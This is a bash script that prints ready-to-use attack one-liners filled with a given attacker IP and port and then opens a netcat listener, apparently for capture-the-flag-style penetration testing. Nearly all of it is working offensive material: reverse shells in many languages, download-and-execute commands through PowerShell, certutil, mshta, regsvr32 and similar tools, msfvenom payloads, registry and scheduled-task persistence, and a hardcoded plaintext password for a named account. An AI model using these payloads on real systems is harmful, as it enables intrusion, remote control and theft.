#!/bin/bash 

printf "\n"

function showHelp {
    printf "\n"
    printf "Usage:   showOneLiners.sh 10.10.14.53 8000 python file.exe\n"
}

function python {
    
    cat << EOF

   python -c 'import pty; pty.spawn("/bin/bash")'
   
   python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'

EOF
}

function powershell {
    
    cat << EOF

   start /b powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://$1/$2/$3')

   mkdir t;(New-Object Net.WebClient).DownloadFile("http://$1:$2/$3","t\\$3");&"t\\$3"

   echo $wc=New-Object Net.WebClient>w.ps1
   echo $u="http://$1/$2">>w.ps1
   echo $f=$3>>w.ps1 
   echo $wc.DownloadFile($u,$f)>>w.ps1
   powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File w.ps1
    
   $c = New-Object System.Net.Sockets.TCPClient("$1",$2);$s=$c.GetStream();[byte[]]$bytes=0..65535|%\{0\};while(($i=$s.Read($bytes,0,$bytes.Length)) -ne 0)\{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sk=(iex $data 2>&1|Out-String);$sk2=$sk+"PS"+(pwd).Path+">";$sb=([text.encoding]::ASCII).GetBytes($sk2);$s.Write($sb,0,$sb.Length);$s.Flush()\};$c.Close()
    
   $u="Helpline\\tolu";$p="!zaq1234567890pl!99\n"
   $ss=ConvertTo-SecureString $p -AsPlainText -Force\n"
   $cred=New-Object System.Management.Automation.PSCredential $u,$ss\n"
   Invoke-Command -ComputerName HELPLINE -Credential $cred -Authentication credssp -ScriptBlock {type C:\\Users\\tolu\\Desktop\\user.txt}"
	
EOF
}

function bash {
    
   cat << EOF

   /usr/bin/wget http://$1:$2/rev_shell -O /dev/shm/rev_shell;chmod 777 /dev/shm/rev_shell;/dev/shm/rev_shell
   
   bash -i >& /dev/tcp/$1/$2 0>&1
  
   exec /bin/bash 0&0 2>&0
   
   0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196"
   
   exec 5<>/dev/tcp/$1/$2 && cat <&5 | while read line; do \$line 2>&5 >&5; done
   
   exec 5<>/dev/tcp/$1/$2 && while read line 0<&5; do \$line 2>&5 >&5; done

EOF
}


function msfvenom {
    
    cat << EOF 
    
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > jsrt.jsp
   
   msfvenom -p php/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f raw > mrt.php
   
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > srt.sh
   
EOF
}

function cmd {
    
    cat << EOF

   mkdir C:\tmp && certutil -urlcache -split -f http://$1:$2/$3 C:\tmp\\$3"
   
EOF
}

function netcat {
    
    cat << EOF

   nc -e /bin/sh $1 $2
   
   nc.exe -e cmd.exe $1 $2

   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f

EOF
}

function recon {
    
    cat << EOF

   cewl -d 2 -m 5 -w words.txt http://$1 2>/dev/null;john --wordlist=words.txt --rules:Tuned --stdout > mangled_words.txt"
   
   dirb http://$1"
   
   dirsearch.py -u http://$1 -e aspx -f -t 20"
   
   wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hs 403 http://$1/FUZZ"
   
   gobuster dir -u http://$1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm"
   
   skipfish -YO -o ~/skipfish http://$1

EOF
}

function persist {

    cat << HERE

   schtasks /create /sc minute /TN "EMOM" /TR "C:\Users\Public\\$1"

   reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v EROR /t REG_SZ /d "C:\Users\Public\\$1"

   reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v EROR /t REG_SZ /d "C:\Users\Public\\$1"

HERE
}

function odd {
	
	cat << EOF

   msfconsole -x "use exploit/windows/iis/iis_webdav_upload_asp;set PAYLOAD $3;set LHOST $1;set LPORT $2"

   apt update && apt install -y virtualbox-guest-x11"

   perl -e 'use Socket;\$i="$1";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'"

   php -r '$sock=fsockopen("$1",$2);exec("/bin/sh -i <&3 >&3 2>&3");'"
   
   ruby -rsocket -e'f=TCPSocket.open("$1",$2).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"
   
   r = Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()"
	
   

   wmic os get /FORMAT:"http://10.10.14.53:9996/fG4DD.xsl

   rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.10.14.53:9997/TE52j",false);x.send();eval(x.responseText);window.close();

   mshta http://10.10.14.53:9996/JehU3

   bitsadmin /transfer kTxCy /download /priority high http://10.10.14.53:9995/kTxCy.wsf %temp%\kTxCy.wsf & start /wait %temp%\kTxCy.wsf & del %temp%\kTxCy.wsf

   regsvr32 /s /u /n /i:http://10.10.14.53:9998/9l4aX scrobj


EOF
}

function openPort {
    nc -nlvp $1
}

ip=$1
port=$2
lang=$3
file=$4

case "$3" in
"python")
    python $ip $port && openPort $port ;;
"powershell")
    powershell $ip $port $file ;;
"bash")
    bash $ip $port && openPort $port ;;
"msfvenom")
    msfvenom $ip $port ;;
"cmd")
    cmd $ip $port $file && openPort $port ;;
"netcat")
    netcat $ip $port && openPort $port ;;
"recon")
    recon $ip $port ;;
"persist")
    persist $file ;;
*)
    showHelp ;;
esac
